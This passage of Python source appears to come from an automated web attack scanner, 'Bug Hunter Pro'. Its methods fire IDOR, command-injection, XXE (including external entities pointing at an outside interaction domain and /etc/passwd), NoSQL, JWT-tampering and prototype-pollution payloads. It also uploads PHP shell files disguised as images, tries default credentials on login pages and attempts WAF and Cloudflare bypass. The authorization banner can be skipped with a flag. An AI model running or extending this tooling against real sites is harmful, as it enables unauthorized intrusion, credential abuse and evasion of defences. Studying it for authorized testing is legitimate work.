            self.log("warn", "No IDOR payloads found, using default")
            idor_payloads = self.get_payloads("IDOR")
        for url in tqdm(self.visited_urls, desc="Testing IDOR", disable=self.silent,
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:
                original_value = params[param][0] if isinstance(
                    params[param], list) and params[param] else ""
                baseline_response = self._safe_request("GET", url)
                baseline_len = len(
                    baseline_response.text) if baseline_response else -1
                for payload in idor_payloads:
                    if payload == original_value:
                        continue
                    test_params = params.copy()
                    test_params[param] = payload
                    test_url = urlunparse(
                        parsed._replace(
                            query=urlencode(
                                test_params, True)))
                    response = self._safe_request("GET", test_url)
                    self.tested_payload_urls.add(test_url)
                    if response and response.status_code == 200 and baseline_len > 0 and abs(len(response.text) - baseline_len) < (baseline_len * 0.1):
                        self._add_finding("high", "Potential IDOR vulnerability", {"param": param, "proof": f"Response length ({len(response.text)}) is similar to baseline ({baseline_len})."}, test_url, module="IDOR", payload=payload)
        self.log(
            "info",
            f"IDOR check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_api_leakage(self):
        self.log_step("Checking for API leakage...")
        self.log(
            "info",
            f"URLs to scan for API Leakage: {
                list(
                    self.visited_urls)}")
        api_paths = self.config.get("SETTINGS", {}).get("API_PATHS", [])
        api_paths.extend(list(self.discovered_api_endpoints)
                         )
        api_paths = sorted(list(set(api_paths)))
        findings_count = len(self.findings)
        sensitive_keys = [
            "api_key",
            "token",
            "secret",
            "password",
            "access_key"]

        def check_api_path(path):
            test_url = urljoin(self.base_url, path)
            response = self._safe_request("GET",
                                          test_url, timeout=5)
            if response and response.status_code == 200 and "application/json" in response.headers.get(
                    "Content-Type", ""):
                try:
                    data = response.json()
                    leaked_keys = self._find_sensitive_keys_in_json(
                        data, sensitive_keys)
                    if leaked_keys:
                        self._add_finding("high", f"Potential API data leakage at {test_url}", {"endpoint": test_url, "leaked_keys": list(leaked_keys)}, test_url, module="API Leakage")
                except json.JSONDecodeError:
                    pass

        if not api_paths:
            self.log("info", "No API paths to check.")
            return

        with ThreadPoolExecutor(max_workers=20) as executor:
            list(
                tqdm(
                    executor.map(
                        check_api_path,
                        api_paths),
                    total=len(api_paths),
                    desc="Testing API leakage",
                    ascii=True))

        self.log(
            "info",
            f"API leakage check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def _find_sensitive_keys_in_json(self, data, sensitive_keys):
        found = set()
        if isinstance(data, dict):
            for key, value in data.items():
                if any(s_key in key.lower() for s_key in sensitive_keys):
                    found.add(key)
                found.update(
                    self._find_sensitive_keys_in_json(
                        value, sensitive_keys))
        elif isinstance(data, list):
            for item in data:
                found.update(
                    self._find_sensitive_keys_in_json(
                        item, sensitive_keys))
        return found

    def check_waf_bypass(self):
        self.log_step("Checking for WAF bypass...")
        self.log(
            "info",
            f"URLs to scan for WAF Bypass: {
                list(
                    self.visited_urls)}")
        waf_payloads = self.get_payloads("WAF_BYPASS")
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing WAF bypass",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            if not params:
                continue
            param_to_test = list(params.keys())[0]
            block_test_params = params.copy()

            block_test_params[param_to_test] = "<script>alert('waf_test')</script>"
            block_test_url = urlunparse(
                parsed._replace(
                    query=urlencode(
                        block_test_params,
                        True)))
            self.tested_payload_urls.add(block_test_url)
            block_response = self._safe_request("GET", block_test_url)
            if not block_response or block_response.status_code == 200:
                self.log(
                    "info",
                    f"No obvious WAF detected at {url}. Skipping WAF bypass check for this URL.")
                continue
            self.log(
                "info", f"WAF detected at {url} (status: {
                    block_response.status_code}). Testing bypasses...")
            for payload in waf_payloads:
                test_params = params.copy()
                test_params[param_to_test] = payload
                test_url = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params, True)))
                response = self._safe_request("GET", test_url)
                self.tested_payload_urls.add(test_url)
                if response and response.status_code != block_response.status_code:
                    self.findings.append(
                        {
                            "severity": "medium",
                            "module": "WAF Bypass",
                            "message": "Potential WAF bypass",
                            "url": test_url,
                            "payload": payload,
                            "evidence": {
                                "param": param_to_test,
                                "proof": f"Bypassed WAF (status {
                                    block_response.status_code}) with status {
                                    response.status_code}."},
                            "score": 50,
                            "timestamp": _get_full_timestamp()})
                    self.total_score += 50
                    self.log(
                        "warn",
                        f"Potential WAF bypass at {test_url} with payload: {payload}",
                        severity="medium")
        self.log(
            "info",
            f"WAF bypass check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_file_upload(self):
        try:
            from bs4 import BeautifulSoup
            BS4_AVAILABLE = True
        except ImportError:
            BS4_AVAILABLE = False
            self.log(
                "warn",
                "BeautifulSoup4 not installed (`pip install beautifulsoup4`). Skipping advanced file upload check.")
            return
        self.log(
            "info",
            f"URLs to scan for File Upload: {
                list(
                    self.visited_urls)}")
        findings_count = len(self.findings)
        for url in tqdm(
                self.visited_urls,
                desc="Finding upload forms",
                file=sys.stdout,
                ascii=True):
            response = self._safe_request("GET", url)
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            if not (
                    response and 'text/html' in response.headers.get('Content-Type', '')):
                continue
            soup = BeautifulSoup(response.text, 'html.parser')

            forms = soup.find_all('form', {'enctype': 'multipart/form-data'})
            for form in forms:
                file_input = form.find('input', {'type': 'file'})
                if not file_input:
                    continue
                action = form.get('action', url)
                upload_url = urljoin(url, action)
                file_param_name = file_input.get('name', 'file')
                self.log(
                    "info",
                    f"Found file upload form at {url}, submitting to {upload_url} with param '{file_param_name}'")
                unique_marker = f"GEMINI_UPLOAD_SUCCESS_{
                    ''.join(
                        random.choices(
                            '0123456789',
                            k=8))}"

                shell_content = f"<?php echo '{unique_marker}'; ?>"
                payloads = {
                    "shell.php": (
                        "application/x-php",
                        shell_content.encode('utf-8')),
                    "shell.php.jpg": (
                        "image/jpeg",
                        shell_content.encode('utf-8')),
                    "shell.gif": (
                        "image/gif",
                        b"GIF89a;" +
                        shell_content.encode('utf-8'))}
                for filename, (content_type, content) in payloads.items():
                    files = {
                        file_param_name: (
                            filename,
                            content,
                            content_type)}
                    upload_response = self._safe_request("POST",
                                                         upload_url, files=files)
                    if upload_response and upload_response.status_code == 200:
                        for upload_path in ["/uploads/",
                                            "/files/", "/images/", ""]:
                            verify_url = urljoin(
                                self.base_url, upload_path + filename)
                            verify_response = self._safe_request("GET", verify_url)
                            if verify_response and unique_marker in verify_response.text:
                                self._add_finding("critical", f"Verified file upload vulnerability at {upload_url}", {"upload_url": upload_url, "file_url": verify_url, "filename": filename}, upload_url, module="File Upload", payload=filename)
                                break
        self.log(
            "info",
            f"File upload check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_crlf_injection(self):
        self.log_step("Checking for CRLF injection...")
        self.log(
            "info",
            f"URLs to scan for CRLF Injection: {
                list(
                    self.visited_urls)}")
        crlf_payloads = self.get_payloads("CRLF")
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing CRLF",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:
                unique_header_name = f"X-Crlf-Check-{
                    ''.join(
                        random.choices(
                            'abcdef0123456789',
                            k=8))}"
                unique_header_value = ''.join(
                    random.choices('abcdefghijklmnopqrstuvwxyz', k=12))
                dynamic_payload = crlf_payloads[0].replace(
                    "Gemini:Injected", f"{unique_header_name}: {unique_header_value}")
                test_params = params.copy()

                test_params[param] = dynamic_payload
                test_url = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params, True)))
                self.tested_payload_urls.add(test_url)
                response = self._safe_request("GET", test_url)
                if response and response.headers.get(
                        unique_header_name) == unique_header_value:
                    self._add_finding("medium", "Potential CRLF injection", {"param": param, "proof": f"Injected header reflected in response: {unique_header_name}: {unique_header_value}"}, test_url, module="CRLF Injection", payload=dynamic_payload)
                    break
        self.log(
            "info",
            f"CRLF injection check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_command_injection(self):
        self.log_step("Checking for OS command injection...")
        self.log(
            "info",
            f"URLs to scan for Command Injection: {
                list(
                    self.visited_urls)}")
        cmd_payloads = self.get_payloads("COMMAND_INJECTION")
        findings_count = len(self.findings)
        for url in tqdm(
                self.visited_urls,
                desc="Testing command injection",
                file=sys.stdout,
                ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:
                baseline_response = self._safe_request("GET", url)

                baseline_text = baseline_response.text if baseline_response else ""
                for payload_template in cmd_payloads:
                    unique_marker = ''.join(
                        random.choices(
                            'abcdefghijklmnopqrstuvwxyz0123456789', k=16))
                    payload = payload_template.replace(
                        "{{MARKER}}", unique_marker)
                    test_params = params.copy()

                    test_params[param] = f"original_value{payload}"
                    test_url_payload = urlunparse(parsed._replace(
                        query=urlencode(test_params, doseq=True)))
                    self.tested_payload_urls.add(test_url_payload)
                    if "sleep" in payload.lower() or "benchmark" in payload.lower() or "pg_sleep" in payload.lower(
                    ) or "ping -c" in payload.lower() or "ping -n" in payload.lower():
                        baseline_params_time = params.copy()
                        baseline_params_time[param] = "baseline_time_check"
                        baseline_url_time = urlunparse(
                            parsed._replace(
                                query=urlencode(
                                    baseline_params_time,
                                    doseq=True)))
                        start_time_base = time.time()
                        self._safe_request("GET", baseline_url_time, timeout=10)
                        end_time_base = time.time()
                        base_duration = end_time_base - start_time_base
                        start_time_payload = time.time()
                        try:
                            self._safe_request("GET",
                                               test_url_payload, timeout=15)
                        except requests.exceptions.Timeout:
                            pass
                        except Exception:
                            pass
                        end_time_payload = time.time()
                        payload_duration = end_time_payload - start_time_payload
                        if payload_duration > (base_duration + 4.5):
                            self._add_finding("critical", "Potential OS command injection (time-based)", {"payload": payload, "delay": f"{payload_duration:.2f}s", "baseline": f"{base_duration:.2f}s", "param": param}, test_url_payload, module="Command Injection", payload=payload)
                            continue
                    response = self._safe_request("GET", test_url_payload)
                    if response and unique_marker in response.text and unique_marker not in baseline_text:
                        output_patterns = {
                            "id": [
                                "uid=", "gid=", "groups="],
                            "whoami": ["root", "daemon", "nt authority\\system", "administrator"], "hostname": [
                                self.host.split('.')[0]], "ver": [
                                "microsoft windows", "version"], "win.ini": [
                                "for 16-bit app support", "[fonts]"]}
                        is_output_vulnerable = False
                        for cmd_keyword, patterns in output_patterns.items(
                        ):
                            if cmd_keyword in payload.lower() and any(p.lower() in response.text.lower()
                                                                      for p in patterns):
                                is_output_vulnerable = True
                                break
                        if is_output_vulnerable:
                            self._add_finding("critical", "Potential OS command injection (output-based)", {"payload": payload, "reflected_marker": unique_marker, "param": param, "response_sample": response.text[:200]}, test_url_payload, module="Command Injection", payload=payload)
                            continue
        self.log(
            "info",
            f"OS command injection check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_xxe(self):
        self.log_step("Checking for XXE vulnerabilities...")
        self.log("info", f"URLs to scan for XXE: {list(self.visited_urls)}")
        xxe_payloads = self.get_payloads("XXE")
        oast_domain = self.get_payloads("OAST").get(
            "INTERACTSH_DOMAIN", "oast.me").split(',')[0]
        findings_count = len(self.findings)

        xml_template = '<?xml version="1.0"?><!DOCTYPE root [{} ]><root></root>'
        for url in tqdm(self.visited_urls, desc="Testing XXE",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            if any(
                url.endswith(ext) for ext in [
                    '.css',
                    '.js',
                    '.png',
                    '.jpg',
                    '.jpeg',
                    '.gif',
                    '.svg',
                    '.woff',
                    '.woff2']):
                continue

            unique_subdomain = f"xxe-{
                ''.join(
                    random.choices(
                        'abcdef0123456789',
                        k=10))}"
            oast_payload_str = f'<!ENTITY % xxe SYSTEM "http://{unique_subdomain}.{oast_domain}"> %xxe;'
            xml_data_oast = xml_template.format(
                oast_payload_str)
            headers = {'Content-Type': 'application/xml'}
            self.tested_payload_urls.add(url)
            self._safe_request("POST",
                               url,
                               data=xml_data_oast,
                               headers=headers,
                               timeout=5)

            self.log(
                "info",
                f"Sent XXE OAST payload to {url}. Check Interactsh for interactions with {unique_subdomain}.{oast_domain}")
            for payload in xxe_payloads:
                xml_data = xml_template.format(payload)
                response = self._safe_request("POST",
                                              url, data=xml_data, headers=headers)
                if not response:
                    continue
                is_vulnerable = False
                if "file:///etc/passwd" in payload and "root:x:0:0" in response.text:
                    is_vulnerable = True
                elif "file://" in payload and response.status_code == 200 and len(response.text) > 50:
                    is_vulnerable = True
                if is_vulnerable:
                    self._add_finding("high", "Potential XXE (In-Band) vulnerability", {"proof": "Server response indicates successful entity processing.", "xml_data": xml_data[:150], "response_sample": response.text[:200]}, url, module="XXE", payload=payload)
        self.log(
            "info", f"XXE check completed. Found {len(self.findings) - findings_count} new findings")

    def check_nosql_injection(self):
        self.log_step("Checking for NoSQL Injection...")
        self.log(
            "info",
            f"URLs to scan for NoSQL Injection: {
                list(
                    self.visited_urls)}")
        nosql_payloads = self.get_payloads("NOSQL_INJECTION")
        findings_count = len(self.findings)
        if not nosql_payloads:
            self.log("warn", "No NoSQL Injection payloads found.")
            return
        for url in tqdm(self.visited_urls, desc="Testing NoSQLi",
                        file=sys.stdout, ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            for param in params:

                time_payload = '{"$where": "sleep(5000)"}'
                test_params_time = params.copy()
                test_params_time[param] = time_payload
                test_url_time = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params_time,
                            True)))
                self.tested_payload_urls.add(test_url_time)
                start_time_base = time.time()
                self._safe_request("GET", url, timeout=10)
                base_duration = time.time() - start_time_base
                start_time_payload = time.time()
                try:
                    self._safe_request("GET", test_url_time, timeout=10)
                except requests.exceptions.Timeout:
                    pass
                duration = time.time() - start_time_payload
                if duration > (base_duration + 4.5):
                    self.log(
                        "warn",
                        f"Potential time-based NoSQLi at {test_url_time}",
                        severity="high")
                    self._add_finding("high", "Potential time-based NoSQL Injection", {"param": param, "proof": f"Response delayed by {duration:.2f}s."}, test_url_time, module="NoSQL Injection", payload=time_payload)
                    continue

                true_payload = '{"$ne": "gemini_non_existent_string"}'
                false_payload = '{"$eq": "gemini_non_existent_string"}'
                params_true = params.copy()
                params_true[param] = true_payload
                url_true = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            params_true, True)))
                self.tested_payload_urls.add(url_true)
                resp_true = self._safe_request("GET", url_true)
                params_false = params.copy()
                params_false[param] = false_payload
                url_false = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            params_false, True)))
                self.tested_payload_urls.add(url_false)
                resp_false = self._safe_request("GET", url_false)
                if resp_true and resp_false and resp_true.status_code == 200 and resp_false.status_code == 200:
                    if len(
                            resp_true.text) != len(
                            resp_false.text):
                        self.log(
                            "warn",
                            f"Potential boolean-based NoSQLi at {url} (param: {param})",
                            severity="high")
                        self._add_finding("high", "Potential boolean-based NoSQL Injection", {"param": param, "proof": f"True ({len(resp_true.text)} bytes) and False ({len(resp_false.text)} bytes) responses differ."}, url, module="NoSQL Injection", payload=true_payload)
        self.log(
            "info",
            f"NoSQL Injection check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_cors_misconfiguration(self):
        self.log_step("Checking for CORS misconfiguration...")
        self.log("info", f"URLs to scan for CORS: {list(self.visited_urls)}")
        cors_payloads = self.get_payloads("CORS_MISCONFIGURATION")
        findings_count = len(self.findings)
        if not cors_payloads:
            self.log("warn", "No CORS payloads found.")
            return
        for url in tqdm(self.visited_urls, desc="Testing CORS",
                        file=sys.stdout, ascii=True):
            for origin_payload in cors_payloads:
                parsed = urlparse(url)
                if not parsed.scheme or not parsed.netloc:
                    self.log("warn", f"Skipping invalid URL: {url}")
                    continue
                for method in ['GET', 'OPTIONS']:
                    headers = {"Origin": origin_payload}
                    self.tested_payload_urls.add(url)
                    response = self._safe_request(method,
                                                  url, headers=headers)
                    if response:
                        allow_origin = response.headers.get(
                            'Access-Control-Allow-Origin', '')
                        allow_creds = response.headers.get(
                            'Access-Control-Allow-Credentials', 'false').lower()
                        if allow_origin == '*' or allow_origin == 'null' or allow_origin == origin_payload:
                            severity = "medium"
                            message = f"CORS misconfiguration at {url} for origin '{origin_payload}'"
                            score = 50
                            if allow_creds == 'true' and allow_origin != '*':
                                severity = "critical"
                                message = f"Critical CORS misconfiguration (credentials allowed) at {url} for origin '{origin_payload}'"
                                score = 90
                            self._add_finding(severity, message, {"proof": f"Origin '{allow_origin}' is allowed with credentials: {allow_creds}.", "method": method}, url, module="CORS", payload=origin_payload)
        self.log(
            "info",
            f"CORS check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_graphql_introspection(self):
        self.log_step("Checking for GraphQL introspection...")
        self.log(
            "info",
            f"URLs to scan for GraphQL: {
                list(
                    self.visited_urls)}")
        graphql_payloads = self.get_payloads("GRAPHQL_INTROSPECTION")
        findings_count = len(self.findings)
        if not graphql_payloads:
            self.log("warn", "No GraphQL introspection payloads found.")
            return
        graphql_endpoints = self.config.get(
            "SETTINGS", {}).get(
            "API_PATHS", [])

        graphql_endpoints = [
            p for p in graphql_endpoints if 'graphql' in p or 'graphiql' in p]
        graphql_endpoints.extend(["/graphql", "/api", "/query"])
        graphql_endpoints = sorted(list(set(graphql_endpoints)))
        for endpoint in tqdm(
                graphql_endpoints,
                desc="Testing GraphQL",
                file=sys.stdout,
                ascii=True):
            test_url = urljoin(self.target, endpoint)
            for payload in graphql_payloads:
                methods_to_test = {

                    "POST": {"headers": {'Content-Type': 'application/json'}, "data": payload},
                    "GET": {"params": {"query": payload}}
                }
                for method, kwargs in methods_to_test.items():
                    response = self._safe_request(method,
                                                  test_url, **kwargs)
                    self.tested_payload_urls.add(test_url)
                    try:
                        if response and response.json().get("data", {}).get("__schema"):
                            self._add_finding("medium", "GraphQL introspection enabled", {"method": method, "proof": "Introspection query returned schema data.", "response_sample": response.text[:250]}, test_url, module="GraphQL", payload=payload)
                    except (json.JSONDecodeError, AttributeError):
                        continue
        self.log(
            "info",
            f"GraphQL introspection check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_default_creds(self):
        self.log_step("Checking for default credentials...")
        self.log(
            "info",
            f"URLs to scan for Default Creds: {
                list(
                    self.visited_urls)}")
        default_creds = self.get_payloads("DEFAULT_CREDS")
        findings_count = len(self.findings)
        if not default_creds:
            self.log("warn", "No default creds payloads found, using default")
            default_creds = self.get_payloads("DEFAULT_CREDS")
        login_endpoints = ["/login", "/admin",
                           "/auth"]
        for endpoint in tqdm(
                login_endpoints,
                desc="Testing default creds",
                file=sys.stdout,
                ascii=True):
            test_url = urljoin(self.target, endpoint)
            for cred in default_creds:
                data = {
                    "username": cred["username"],
                    "password": cred["password"]}
                response = self._safe_request("POST",
                                              test_url, data=data)
                self.tested_payload_urls.add(test_url)
                if response and ("welcome" in response.text.lower()
                                 or (response.is_redirect and response.headers.get("Location") != test_url and "login" not in response.headers.get("Location", ""))):
                    self._add_finding("critical", "Default credentials may be working", {"proof": "Login attempt resulted in a redirect or welcome message."}, test_url, module="Default Credentials", payload=str(cred))
        self.log(
            "info",
            f"Default creds check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def check_jwt(self):
        self.log_step("Checking for JWT issues...")
        self.log("info", f"URLs to scan for JWT: {list(self.visited_urls)}")
        jwt_payloads = self.get_payloads("JWT_PAYLOADS")
        findings_count = len(self.findings)
        for url in tqdm(self.visited_urls, desc="Testing JWT",
                        file=sys.stdout, ascii=True):
            original_response = self._safe_request("GET", url)
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            if not original_response:
                continue
            auth_header = original_response.request.headers.get(
                "Authorization", "")
            if "bearer" in auth_header.lower():
                original_token = auth_header.split(" ")[1]
                invalid_headers = original_response.request.headers.copy()
                del invalid_headers["Authorization"]
                invalid_response = self._safe_request("GET",
                                                      url, headers=invalid_headers)
                invalid_len = len(
                    invalid_response.text) if invalid_response else -1
                valid_len = len(original_response.text)
                if valid_len == invalid_len:
                    continue
                self.log(
                    "info",
                    f"Found JWT in Authorization header for {url}. Testing payloads...")
                for payload in jwt_payloads:
                    test_headers = original_response.request.headers.copy()
                    test_headers["Authorization"] = f"Bearer {payload}"
                    test_response = self._safe_request("GET",
                                                       url, headers=test_headers)
                    self.tested_payload_urls.add(url)
                    if test_response:
                        if abs(
                                len(
                                    test_response.text) -
                                valid_len) < (
                                valid_len *
                                0.1) and len(
                                test_response.text) != invalid_len and invalid_len > 0:
                            self._add_finding("critical", "Potential JWT vulnerability (e.g., alg:none)", {"location": "Authorization Header", "proof": "Request with modified JWT was accepted."}, url, module="JWT", payload=payload)
        self.log(
            "info", f"JWT check completed. Found {len(self.findings) - findings_count} new findings")

    def check_prototype_pollution(self):
        self.log_step("Checking for Prototype Pollution...")
        self.log(
            "info",
            f"URLs to scan for Prototype Pollution: {
                list(
                    self.visited_urls)}")
        pp_payloads = self.get_payloads("PROTOTYPE_POLLUTION").get(
            "PAYLOADS", ["__proto__[is_polluted]=true"])
        findings_count = len(self.findings)
        for url in tqdm(
                self.visited_urls,
                desc="Testing Prototype Pollution",
                file=sys.stdout,
                ascii=True):
            parsed = urlparse(url)
            if not parsed.scheme or not parsed.netloc:
                self.log("warn", f"Skipping invalid URL: {url}")
                continue
            params = parse_qs(parsed.query)
            if not params:
                continue
            param_to_test = list(params.keys())[0]
            unique_prop = f"gemini_prop_{
                ''.join(
                    random.choices(
                        'abcdefghijklmnopqrstuvwxyz',
                        k=8))}"
            for payload in pp_payloads:
                pollution_payload = payload.replace("is_polluted", unique_prop)
                test_params = params.copy()
                test_params[param_to_test] = [pollution_payload]
                pollute_url = urlunparse(
                    parsed._replace(
                        query=urlencode(
                            test_params, True)))
                self.tested_payload_urls.add(pollute_url)
                self._safe_request("GET", pollute_url)
                check_url = urljoin(
                    self.base_url,
                    f"/?check={unique_prop}")
                check_response = self._safe_request(check_url)
                if check_response and unique_prop in check_response.text:
                    self._add_finding("high", "Potential Prototype Pollution detected", {"check_url": check_url, "proof": f"Polluted property '{unique_prop}' was reflected."}, pollute_url, module="Prototype Pollution", payload=pollution_payload)
        self.log(
            "info",
            f"Prototype Pollution check completed. Found {
                len(
                    self.findings) -
                findings_count} new findings")

    def run_whois(self):
        if not WHOIS_AVAILABLE:
            self.log(
                "warn",
                "python-whois is not installed. Install: pip install python-whois")
            return

        self.log("run", "Running a WHOIS lookup...")
        try:
            w = whois.whois(self.host)
            details = f"""
            Registrar: {w.registrar}
            Creation Date: {w.creation_date}
            Expiry Date: {w.expiry_date}
            Name Servers: {', '.join(w.name_servers) if w.name_servers else 'N/A'}
            Org: {w.org}
            Country: {w.country}
            """
            self._add_finding("info", "WHOIS Information", details.strip(), self.target, module="WHOIS")
            self.log("success", f"WHOIS selesai: {w.registrar}")
        except Exception as e:
            self.log("error", f"WHOIS gagal: {e}")

    def _run_nuclei_scan(self):
        self.log("run", "Preparing nuclei scan...")
        nuclei_path = shutil.which("nuclei")
        if not nuclei_path:
            self.log(
                "error",
                "Nuclei tidak terinstall. Install: go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest")
            return

        output_file = os.path.join(self.output_dir, "nuclei_report.jsonl")
        cmd = [
            nuclei_path,
            "-u", self.target,
            "-jsonl",
            "-o", output_file,
            "-stats",
            "-rl", "20",
            "-c", "50",
            "-timeout", "10",
            "-retries", "2"
        ]

        username = self.extract_username(self.target)
        if username:
            cmd += ["-var", f"user={username}"]
            self.log("info", f"Auto-set template var: user={username}")

        cmd_str = " ".join(cmd)
        self.log("debug", f"Executing nuclei: {cmd_str}")

        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True)

            def stream_output():
                try:
                    for line in process.stdout:
                        if line.strip():
                            self.log("info", line.strip())
                except ValueError:
                    pass
                finally:
                    if not process.stdout.closed:
                        process.stdout.close()

            thread = threading.Thread(target=stream_output, daemon=True)
            thread.start()

            thread.join(timeout=self.nuclei_timeout)

            if thread.is_alive():
                self.log("warn", f"Nuclei timeout ({self.nuclei_timeout // 60} menit). Membunuh proses...")
                process.kill()
                process.communicate()

            if process.returncode == 0 and not thread.is_alive():
                self.log("success", f"Nuclei selesai. Laporan: {output_file}")
                self._parse_nuclei_report(output_file)
            elif process.returncode != 0:
                self.log("error", f"Nuclei gagal (exit code: {process.returncode})")

        except subprocess.TimeoutExpired:
            self.log(
                "warn",
                f"Nuclei timeout ({self.nuclei_timeout // 60} menit). Membunuh proses...")
            process.kill()
            process.communicate()
        except Exception as e:
            self.log("error", f"Nuclei error: {e}")

    def run_specific_module(self, module_name):
        module_map = {
            "xss": self.check_xss,
            "sqli": self.test_sql_injection,
            "ssti": self.check_ssti,
            "lfi": self.check_lfi,
            "rfi": self.check_rfi,
            "ssrf": lambda: (
                self.check_ssrf(),
                self.check_ssrf_oast(),
                self.check_internal_access_via_ssrf()),
            "ssrf_internal": self.check_internal_access_via_ssrf,
            "open_redirect": self.check_open_redirect,
            "csrf": self.check_csrf,
            "idor": self.check_idor,
            "api_leakage": self.check_api_leakage,
            "waf_bypass": self.check_waf_bypass,
            "file_upload": self.check_file_upload,
            "crlf": self.check_crlf_injection,
            "command_injection": self.check_command_injection,
            "xxe": self.check_xxe,
            "nosql_injection": self.check_nosql_injection,
            "cors": self.check_cors_misconfiguration,
            "graphql": self.check_graphql_introspection,
            "default_creds": self.check_default_creds,
            "jwt": self.check_jwt,
            "prototype_pollution": self.check_prototype_pollution,
            "oauth": self.check_oauth_misconfig,
            "session_fixation": self.check_session_fixation,
            "api_token_leak": self.check_api_token_leak,
            "security_headers": self.check_security_headers,
            "whois": self.run_whois,
        }
        if module_name in module_map:
            self.log("run", f"Running module: {module_name}")
            module_map[module_name]()
        else:
            self.log("error", f"Unknown module: {module_name}")

    def stop(self):
        """Signals all running checks to stop."""
        self.log("warn", "Received stop signal for scanning.")
        self.stop_event.set()

    def run(self, auto_confirm: bool = False) -> None:
        self.log("info", f"Starting scan on {self.target}")
        print(f"\n🎯 Bug Hunter Pro V1.5.5 — Ultimate Auto Vuln Hunter")
        print(f"Target: {self.target}")
        if self.scope_regex:
            print(f"Scope Regex: {self.scope_regex}")
        if self.cookie:
            print("Authentication: Enabled (cookie provided)")
        if self.proxy:
            print(f"Proxy: {self.proxy}")
        print(f"Shell files: {', '.join(self.shell_files)}")
        print(f"Config file: {self.config_path}")
        print(f"Payloads dir: {self.payloads_dir}")
        print("=" * 60)
        if not auto_confirm:
            self.log(
                "warn",
                "This tool is for educational purposes and authorized testing only.")
            self.log(
                "warn",
                "Do not use on systems without explicit written permission.")
            self.log("warn", "You are responsible for your actions.")

            print(
                f"\n{
                    Fore.YELLOW}Type '1' to continue: {
                    Style.RESET_ALL}",
                end="")
            sys.stdout.flush()
            confirm = sys.stdin.readline()
            if confirm.strip() != '1':
                self.log("error", "Aborted by user.")
                return

        if self.stop_event.is_set():
            self.log("warn", "Scan cancelled.")
            return

        try:
            self.ensure_bruteforce_wordlist()

            self.log(
                "info",
                f"Initial visited_urls: {
                    list(
                        self.visited_urls)}")
            self.check_dependencies()
            if self.enable_cfbypass:
                self.bypass_cloudflare(
                    self.cf_use_tor,
                    self.cf_aggressive,
                    self.cf_timeout)

            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return

            self.run_whois()

            test_response = self._safe_request("GET",
                                               self.target, timeout=10)
            if not test_response:
                self.log(
                    "error", f"Cannot connect to initial target {
                        self.target}. Skipping to subdomain discovery.")

            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return
            subdomains = self.discover_subdomains()
            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return

            all_hosts = list(set([self.host] + [s for s in subdomains if s]))
            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return
            live_hosts = self.probe_live_hosts(all_hosts)

            validated_hosts = []
            for host in live_hosts:
                parsed = urlparse(host)
                if parsed.scheme and parsed.netloc:
                    validated_hosts.append(host)
                else:
                    self.log("warn", f"Skipping invalid live host: {host}")
            self.visited_urls = set(validated_hosts)
            self.log(
                "info",
                f"Validated visited_urls: {
                    list(
                        self.visited_urls)}")

            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return
            if self.auto_register:
                self._auto_register()

            if self.stop_event.is_set():
                self.log("warn", "Scan cancelled.")
                return
            self.crawl()

            if not self.stop_event.is_set():
                self._discover_paths_from_config()

            if not self.stop_event.is_set():
                self.check_security_headers()
            if not self.stop_event.is_set():
                self.check_xss()
            if not self.stop_event.is_set():
                self.test_sql_injection()
            if not self.stop_event.is_set():
                self.check_ssti()
            if not self.stop_event.is_set():
                self.check_lfi()
            if not self.stop_event.is_set():
                self.check_rfi()
            if self.enable_ssrf:
                if not self.stop_event.is_set():
                    self.check_ssrf()
                if not self.stop_event.is_set():
                    self.check_ssrf_oast()
                if not self.stop_event.is_set():
                    self.check_internal_access_via_ssrf()
            if not self.stop_event.is_set():
                self.check_open_redirect()
            if not self.stop_event.is_set():
